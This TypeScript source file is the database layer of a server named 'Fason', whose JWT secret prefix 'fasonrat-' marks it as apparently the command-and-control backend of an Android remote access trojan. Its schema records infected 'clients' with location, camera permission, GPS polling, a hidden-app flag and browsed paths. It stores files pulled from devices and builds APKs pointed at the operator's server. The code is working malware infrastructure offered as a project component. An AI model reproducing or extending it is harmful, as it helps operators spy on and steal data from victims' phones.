import crypto from 'crypto';
import Database from 'better-sqlite3';
import { drizzle } from 'drizzle-orm/better-sqlite3';
import { eq, and, desc, sql, count, lt } from 'drizzle-orm';
import * as schema from './schema.js';
import { paths, ensureDataDir } from '../config/paths.js';
import { log } from '../utils/logger.js';
import {
  users,
  sessions,
  clientData,
  clientFiles,
  logs,
  buildRecords,
  settings,
  loginAttempts,
  jwtSecret,
} from './schema.js';
import { ALL_PERMISSIONS, DEFAULT_USER_PERMISSIONS, resolvePermissions } from '../types/index.js';
import type { Permission, UserRole } from '../types/index.js';

export type DB = ReturnType<typeof drizzle<typeof schema>>;

let dbInstance: DB | null = null;
let sqliteDb: Database.Database | null = null;

export function getDb(): DB {
  if (!dbInstance) {
    throw new Error('Database not initialized. Call initDb() first.');
  }
  return dbInstance;
}

export function getSqliteDb(): Database.Database {
  if (!sqliteDb) {
    throw new Error('Database not initialized. Call initDb() first.');
  }
  return sqliteDb;
}

export function initDb(): DB {
  ensureDataDir();
  sqliteDb = new Database(paths.dbPath);

  sqliteDb.pragma('journal_mode = WAL');
  sqliteDb.pragma('foreign_keys = ON');
  sqliteDb.pragma('synchronous = NORMAL');
  sqliteDb.pragma('cache_size = -64000');
  sqliteDb.pragma('busy_timeout = 5000');

  sqliteDb.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      email TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL,
      role TEXT NOT NULL DEFAULT 'user' CHECK(role IN ('admin', 'user')),
      permissions TEXT NOT NULL DEFAULT '[]',
      is_default INTEGER DEFAULT 0,
      created_at TEXT NOT NULL DEFAULT (datetime('now')),
      last_login TEXT
    );

    CREATE TABLE IF NOT EXISTS sessions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      token TEXT UNIQUE NOT NULL,
      user_id INTEGER NOT NULL,
      ip TEXT NOT NULL,
      created_at TEXT NOT NULL DEFAULT (datetime('now')),
      expires_at TEXT NOT NULL,
      FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS clients (
      id TEXT PRIMARY KEY,
      ip TEXT DEFAULT '',
      country TEXT,
      city TEXT,
      timezone TEXT,
      first_seen TEXT DEFAULT (datetime('now')),
      last_seen TEXT DEFAULT (datetime('now')),
      online INTEGER DEFAULT 0,
      reconnect_count INTEGER DEFAULT 0,
      device_model TEXT,
      device_brand TEXT,
      device_version TEXT,
      fason_hidden INTEGER DEFAULT 0,
      camera_permission INTEGER DEFAULT 0,
      current_path TEXT DEFAULT '',
      gps_interval INTEGER DEFAULT 0,
      device_info TEXT
    );

    CREATE TABLE IF NOT EXISTS client_data (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      client_id TEXT NOT NULL,
      data_type TEXT NOT NULL,
      data TEXT DEFAULT '[]',
      updated_at TEXT DEFAULT (datetime('now')),
      UNIQUE(client_id, data_type),
      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS client_files (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      client_id TEXT NOT NULL,
      file_type TEXT NOT NULL,
      original_name TEXT NOT NULL,
      mime_type TEXT,
      data BLOB NOT NULL,
      file_size INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      type TEXT NOT NULL DEFAULT 'INFO',
      category TEXT NOT NULL DEFAULT 'SYSTEM',
      message TEXT NOT NULL,
      details TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS build_records (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      server_url TEXT NOT NULL,
      home_page_url TEXT NOT NULL,
      app_name TEXT NOT NULL DEFAULT 'Fason',
      status TEXT DEFAULT 'pending',
      apk_data BLOB,
      file_size INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (datetime('now')),
      completed_at TEXT
    );

    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      value TEXT NOT NULL,
      updated_at TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS login_attempts (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      ip TEXT NOT NULL,
      attempted_at TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS jwt_secret (
      id INTEGER PRIMARY KEY CHECK (id = 1),
      secret TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS device_enrollments (
      id TEXT PRIMARY KEY,
      token_hash TEXT UNIQUE NOT NULL,
      status TEXT NOT NULL DEFAULT 'pending' CHECK(status IN ('pending', 'consumed', 'revoked', 'expired')),
      device_id TEXT,
      app_name TEXT NOT NULL DEFAULT 'Fason',
      created_at TEXT NOT NULL,
      expires_at TEXT NOT NULL,
      consumed_at TEXT
    );

    CREATE TABLE IF NOT EXISTS device_credentials (
      device_id TEXT PRIMARY KEY,
      secret_hash TEXT NOT NULL,
      pending_secret_hash TEXT,
      status TEXT NOT NULL DEFAULT 'active' CHECK(status IN ('active', 'revoked')),
      enrollment_id TEXT,
      created_at TEXT NOT NULL,
      rotated_at TEXT,
      last_used_at TEXT,
      revoked_at TEXT,
      FOREIGN KEY (enrollment_id) REFERENCES device_enrollments(id) ON DELETE SET NULL
    );

    CREATE INDEX IF NOT EXISTS idx_sessions_token ON sessions(token);
    CREATE INDEX IF NOT EXISTS idx_sessions_user_id ON sessions(user_id);
    CREATE INDEX IF NOT EXISTS idx_sessions_expires_at ON sessions(expires_at);
    CREATE INDEX IF NOT EXISTS idx_clients_online ON clients(online);
    CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen);
    CREATE INDEX IF NOT EXISTS idx_client_data_client_type ON client_data(client_id, data_type);
    CREATE INDEX IF NOT EXISTS idx_client_files_client ON client_files(client_id, file_type);
    CREATE INDEX IF NOT EXISTS idx_logs_type ON logs(type);
    CREATE INDEX IF NOT EXISTS idx_logs_category ON logs(category);
    CREATE INDEX IF NOT EXISTS idx_logs_created_at ON logs(created_at);
    CREATE INDEX IF NOT EXISTS idx_users_username ON users(username);
    CREATE INDEX IF NOT EXISTS idx_users_email ON users(email);
    CREATE INDEX IF NOT EXISTS idx_login_attempts_ip ON login_attempts(ip);
    CREATE INDEX IF NOT EXISTS idx_login_attempts_attempted_at ON login_attempts(attempted_at);
    CREATE INDEX IF NOT EXISTS idx_device_enrollments_status ON device_enrollments(status);
    CREATE INDEX IF NOT EXISTS idx_device_enrollments_device ON device_enrollments(device_id);
    CREATE INDEX IF NOT EXISTS idx_device_credentials_status ON device_credentials(status);
  `);

  // Migrate: client_files schema change (file_path/stored_name → data blob)
  try {
    const tableInfo = sqliteDb.pragma('table_info(client_files)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);

    if (columnNames.includes('file_path') && !columnNames.includes('data')) {
      log.info('Migrating client_files: file_path/stored_name → data BLOB...');
      sqliteDb.exec(`DROP TABLE IF EXISTS client_files`);
      sqliteDb.exec(`
        CREATE TABLE client_files (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          client_id TEXT NOT NULL,
          file_type TEXT NOT NULL,
          original_name TEXT NOT NULL,
          mime_type TEXT,
          data BLOB NOT NULL,
          file_size INTEGER DEFAULT 0,
          created_at TEXT DEFAULT (datetime('now')),
          FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
        )
      `);
      sqliteDb.exec(`CREATE INDEX IF NOT EXISTS idx_client_files_client ON client_files(client_id, file_type)`);
      log.info('client_files migration completed (old file data cleared)');
    }
  } catch (err: unknown) {
    log.warn(`client_files migration warning: ${err instanceof Error ? err.message : String(err)}`);
  }

  // Migrate: add email, role, and permissions columns if missing
  try {
    const tableInfo = sqliteDb.pragma('table_info(users)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);

    if (!columnNames.includes('email')) {
      sqliteDb.exec(`ALTER TABLE users ADD COLUMN email TEXT NOT NULL DEFAULT ''`);
      sqliteDb.exec(`UPDATE users SET email = username || '@fason.com' WHERE email = '' OR email IS NULL`);
      try {
        sqliteDb.exec(`CREATE UNIQUE INDEX IF NOT EXISTS idx_users_email ON users(email)`);
      } catch { /* ignore if duplicates exist */ }
    }

    if (!columnNames.includes('role')) {
      sqliteDb.exec(`ALTER TABLE users ADD COLUMN role TEXT NOT NULL DEFAULT 'admin'`);
      sqliteDb.exec(`UPDATE users SET role = 'admin'`);
    }

    if (!columnNames.includes('permissions')) {
      sqliteDb.exec(`ALTER TABLE users ADD COLUMN permissions TEXT NOT NULL DEFAULT '[]'`);
      const existingUsers = sqliteDb.prepare('SELECT id, role FROM users').all() as Array<{ id: number; role: string }>;
      for (const u of existingUsers) {
        const perms = u.role === 'admin' ? JSON.stringify(ALL_PERMISSIONS) : JSON.stringify(DEFAULT_USER_PERMISSIONS);
        sqliteDb.prepare('UPDATE users SET permissions = ? WHERE id = ?').run(perms, u.id);
      }
    }
  } catch (err: unknown) {
    log.warn(`Migration warning: ${err instanceof Error ? err.message : String(err)}`);
  }

  // Migrate: build_records schema change (progress TEXT → apk_data BLOB + file_size INTEGER)
  try {
    const tableInfo = sqliteDb.pragma('table_info(build_records)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);

    if (columnNames.includes('progress') && !columnNames.includes('apk_data')) {
      log.info('Migrating build_records: progress → apk_data/file_size...');
      sqliteDb.exec(`DROP TABLE IF EXISTS build_records`);
      sqliteDb.exec(`
        CREATE TABLE build_records (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          server_url TEXT NOT NULL,
          home_page_url TEXT NOT NULL,
          app_name TEXT NOT NULL DEFAULT 'Fason',
          status TEXT DEFAULT 'pending',
          apk_data BLOB,
          file_size INTEGER DEFAULT 0,
          created_at TEXT DEFAULT (datetime('now')),
          completed_at TEXT
        )
      `);
      log.info('build_records migration completed (old build data cleared)');
    }
  } catch (err: unknown) {
    log.warn(`build_records migration warning: ${err instanceof Error ? err.message : String(err)}`);
  }

  dbInstance = drizzle(sqliteDb, { schema });
  log.info('Database initialized successfully (Drizzle ORM)');
  return dbInstance;
}

export function closeDb(): void {
  if (sqliteDb) {
    sqliteDb.close();
    sqliteDb = null;
    dbInstance = null;
    log.info('Database connection closed');
  }
}

export const dbHelpers = {
  getOrCreateClientData(clientId: string, dataType: string): string {
    const d = getDb();
    const row = d.select({ data: clientData.data })
      .from(clientData)
      .where(and(eq(clientData.clientId, clientId), eq(clientData.dataType, dataType)))
      .get();
    if (row) return row.data ?? '[]';
    d.insert(clientData).values({ clientId, dataType, data: '[]' }).run();
    return '[]';
  },

  ensureClientDataBatch(clientId: string, dataTypes: string[]): void {
    const raw = getSqliteDb();
    const now = new Date().toISOString();
    const stmt = raw.prepare(
      `INSERT OR IGNORE INTO client_data (client_id, data_type, data, updated_at) VALUES (?, ?, '[]', ?)`
    );
    const tx = raw.transaction((types: string[]) => {
      for (const type of types) {
        stmt.run(clientId, type, now);
      }
    });
    tx(dataTypes);
  },

  setClientData(clientId: string, dataType: string, data: string): void {
    const d = getDb();
    const existing = d.select({ id: clientData.id })
      .from(clientData)
      .where(and(eq(clientData.clientId, clientId), eq(clientData.dataType, dataType)))
      .get();
    if (existing) {
      d.update(clientData)
        .set({ data, updatedAt: new Date().toISOString() })
        .where(eq(clientData.id, existing.id))
        .run();
    } else {
      d.insert(clientData).values({ clientId, dataType, data }).run();
    }
  },

  addClientFile(clientId: string, fileType: string, originalName: string, mimeType: string, data: Buffer, fileSize: number): void {
    const d = getDb();
    d.insert(clientFiles).values({
      clientId, fileType, originalName, mimeType, data, fileSize,
    }).run();
  },

  getClientFiles(clientId: string, fileType: string): Array<{
    id: number; originalName: string; mimeType: string | null; fileSize: number | null; createdAt: string | null;
  }> {
    const d = getDb();
    return d.select({
      id: clientFiles.id,
      originalName: clientFiles.originalName,
      mimeType: clientFiles.mimeType,
      fileSize: clientFiles.fileSize,
      createdAt: clientFiles.createdAt,
    })
      .from(clientFiles)
      .where(and(eq(clientFiles.clientId, clientId), eq(clientFiles.fileType, fileType)))
      .orderBy(desc(clientFiles.createdAt))
      .all();
  },

  addLog(type: string, category: string, message: string, details?: string): void {
    const d = getDb();
    d.insert(logs).values({ type, category, message, details: details || null }).run();
    // Trim logs periodically (every 100 inserts) to reduce write amplification
    const raw = getSqliteDb();
    const countResult = raw.prepare('SELECT COUNT(*) as cnt FROM logs').get() as { cnt: number };
    if (countResult.cnt > 11000) {
      raw.prepare(`DELETE FROM logs WHERE id NOT IN (SELECT id FROM logs ORDER BY created_at DESC LIMIT ?)`).run(10000);
    }
  },

  cleanExpiredSessions(): number {
    const d = getDb();
    const now = new Date().toISOString();
    const result = d.delete(sessions).where(lt(sessions.expiresAt, now)).run();
    return result.changes;
  },

  checkLoginAttempts(ip: string, maxAttempts: number, windowMs: number): boolean {
    const d = getDb();
    const cutoff = new Date(Date.now() - windowMs).toISOString();
    const result = d.select({ count: count() })
      .from(loginAttempts)
      .where(and(eq(loginAttempts.ip, ip), sql`${loginAttempts.attemptedAt} > ${cutoff}`))
      .get();
    return (result?.count ?? 0) >= maxAttempts;
  },

  recordLoginAttempt(ip: string): void {
    const d = getDb();
    d.insert(loginAttempts).values({ ip }).run();
  },

  cleanLoginAttempts(olderThanMs: number): number {
    const d = getDb();
    const cutoff = new Date(Date.now() - olderThanMs).toISOString();
    const result = d.delete(loginAttempts).where(lt(loginAttempts.attemptedAt, cutoff)).run();
    return result.changes;
  },

  getOrCreateJwtSecret(): string {
    if (process.env.JWT_SECRET) return process.env.JWT_SECRET;
    try {
      const d = getDb();
      const row = d.select({ secret: jwtSecret.secret })
        .from(jwtSecret)
        .where(eq(jwtSecret.id, 1))
        .get();
      if (row) return row.secret;
      const secret = 'fasonrat-' + crypto.randomUUID();
      d.insert(jwtSecret).values({ id: 1, secret }).run();
      return secret;
    } catch {
      log.error('Failed to read JWT secret from DB, generating temporary secret');
      return 'fasonrat-err-' + crypto.randomUUID();
    }
  },

  getUserByUsernameOrEmail(identifier: string): typeof schema.users.$inferSelect | undefined {
    const d = getDb();
    const lowerIdent = identifier.toLowerCase();
    return d.select().from(users).where(
      sql`LOWER(${users.username}) = ${lowerIdent} OR LOWER(${users.email}) = ${lowerIdent}`
    ).get();
  },

  getUserById(id: number): typeof schema.users.$inferSelect | undefined {
    const d = getDb();
    return d.select().from(users).where(eq(users.id, id)).get();
  },

  getAllUsers(): Array<Omit<typeof schema.users.$inferSelect, 'password'>> {
    const d = getDb();
    return d.select({
      id: users.id,
      username: users.username,
      email: users.email,
      role: users.role,
      permissions: users.permissions,
      isDefault: users.isDefault,
      createdAt: users.createdAt,
      lastLogin: users.lastLogin,
    }).from(users).orderBy(desc(users.id)).all();
  },

  createUser(username: string, email: string, passwordHash: string, role: 'admin' | 'user' = 'user', permissions?: Permission[]): number {
    const d = getDb();
    const perms = role === 'admin' ? JSON.stringify(ALL_PERMISSIONS) : JSON.stringify(permissions || DEFAULT_USER_PERMISSIONS);
    const result = d.insert(users).values({
      username: username.toLowerCase(),
      email: email.toLowerCase(),
      password: passwordHash,
      role,
      permissions: perms,
    }).run();
    return result.lastInsertRowid as number;
  },

  updateUser(id: number, data: { username?: string; email?: string; role?: 'admin' | 'user'; permissions?: string }): boolean {
    const d = getDb();
    // Sanitize permissions: ensure it is valid JSON and only contains known permissions
    if (data.permissions !== undefined) {
      try {
        const parsed = JSON.parse(data.permissions);
        if (!Array.isArray(parsed)) {
          throw new Error('Permissions must be a JSON array');
        }
        // Filter to only include valid known permissions
        const filtered = parsed.filter((p: any) => ALL_PERMISSIONS.includes(p as Permission));
        data.permissions = JSON.stringify(filtered);
      } catch (err: unknown) {
        log.warn(`updateUser: invalid permissions value, ignoring — ${err instanceof Error ? err.message : String(err)}`);
        delete data.permissions;
      }
    }
    const result = d.update(users).set(data).where(eq(users.id, id)).run();
    return result.changes > 0;
  },

  updateUserPassword(id: number, passwordHash: string): boolean {
    const d = getDb();
    const result = d.update(users).set({ password: passwordHash }).where(eq(users.id, id)).run();
    return result.changes > 0;
  },

  deleteUser(id: number): boolean {
    const d = getDb();
    const result = d.delete(users).where(eq(users.id, id)).run();
    return result.changes > 0;
  },

  getAdminCount(): number {
    const d = getDb();
    const result = d.select({ count: count() }).from(users).where(eq(users.role, 'admin')).get();
    return result?.count ?? 0;
  },

  getUserPermissions(id: number): Permission[] {
    const d = getDb();
    const user = d.select({ role: users.role, permissions: users.permissions }).from(users).where(eq(users.id, id)).get();
    if (!user) return [];
    return resolvePermissions(user.role as UserRole, user.permissions);
  },
};
